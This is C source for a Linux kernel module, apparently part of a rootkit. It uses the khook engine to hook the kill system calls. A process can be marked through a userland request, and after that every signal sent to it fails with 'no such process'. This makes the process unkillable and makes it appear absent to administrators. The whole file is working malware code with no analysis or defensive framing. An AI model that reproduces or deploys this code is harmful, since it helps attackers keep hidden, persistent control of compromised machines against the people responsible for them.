#include "../khook/engine.h"
#include "../protocol.h"
#include "process_protection.h"

#include <linux/uaccess.h> // copy_from_user
#include <linux/pid.h> // find_get_pid, put_pid, get_pid_task
#include <linux/sched.h> // find_task_by_vpid
#include <linux/sched/task.h> // put_task_struct
#include <linux/cred.h> // copy_creds, exit_creds
#include <linux/slab.h> // kmalloc, kfree
#include <linux/stat.h> // struct kstat
#include <linux/signal.h>

#define PROTECT_PROCESS_FLAG 0x00000008

// return 1 if protected
static int is_task_struct_protected(struct task_struct *pid_task) {
    return pid_task && (pid_task->flags & PROTECT_PROCESS_FLAG);
}

// return zero if success
static int protect_process(unsigned int pid) {
    rcu_read_lock();
    struct pid *pid_pointer = find_get_pid(pid);
    if (pid_pointer == NULL) {
        goto err;
    }
    struct task_struct *pid_task = get_pid_task(pid_pointer, PIDTYPE_PID);
    if (pid_task == NULL) {
        goto err;
    }
    pid_task->flags |= PROTECT_PROCESS_FLAG;
    put_task_struct(pid_task);
    put_pid(pid_pointer);
    rcu_read_unlock();
    return 0;

    err:
    if (pid_pointer != NULL) {
        put_pid(pid_pointer);
    }
    rcu_read_unlock();
    return 1;
}

int protect_process_hiding_request(void *raw_subargs) {
    struct ProcessProtectingSubargs subargs;
    if (copy_from_user(&subargs, (void *)raw_subargs, sizeof(struct ProcessProtectingSubargs)) != 0) {
        // copy failed
        goto err;
    }
    if (protect_process(subargs.pid) != 0) {
        // process protect failed
        goto err;
    }
    return 0;

    err:
    return 1;
}


KHOOK_EXT(long, sys_kill, long,long);
static long khook_sys_kill(long pid, long sig) {
    rcu_read_lock();
    struct pid *pid_pointer = find_get_pid(pid);
    if (pid_pointer == NULL) {
        goto err;
    }
    struct task_struct *pid_task = get_pid_task(pid_pointer, PIDTYPE_PID);
    if (pid_task == NULL) {
        goto err;
    }
    if (is_task_struct_protected(pid_task)) {
        put_task_struct(pid_task);
        put_pid(pid_pointer);
        rcu_read_unlock();
        return -ESRCH;
    }
    put_task_struct(pid_task);
    put_pid(pid_pointer);
    rcu_read_unlock();
    return KHOOK_ORIGIN(sys_kill, pid, sig);
    
    err:
    if (pid_pointer != NULL) {
        put_pid(pid_pointer);
    }
    rcu_read_unlock();
    return 1;
}

KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs*);
static long khook___x64_sys_kill(const struct pt_regs* regs) {
    if (regs == NULL || regs->si == 0) {
        return KHOOK_ORIGIN(__x64_sys_kill, regs);
    }
    rcu_read_lock();
    struct pid *pid_pointer = find_get_pid(regs->di);
    if (pid_pointer == NULL) {
        goto err;
    }
    struct task_struct *pid_task = get_pid_task(pid_pointer, PIDTYPE_PID);
    if (pid_task == NULL) {
        goto err;
    }
    if (is_task_struct_protected(pid_task)) {
        put_task_struct(pid_task);
        put_pid(pid_pointer);
        rcu_read_unlock();
        return -ESRCH; // 显示没有该进程
    }
    put_task_struct(pid_task);
    put_pid(pid_pointer);
    rcu_read_unlock();
    return KHOOK_ORIGIN(__x64_sys_kill, regs);
    
    err:
    if (pid_pointer != NULL) {
        put_pid(pid_pointer);
    }
    rcu_read_unlock();
    return 1;
}
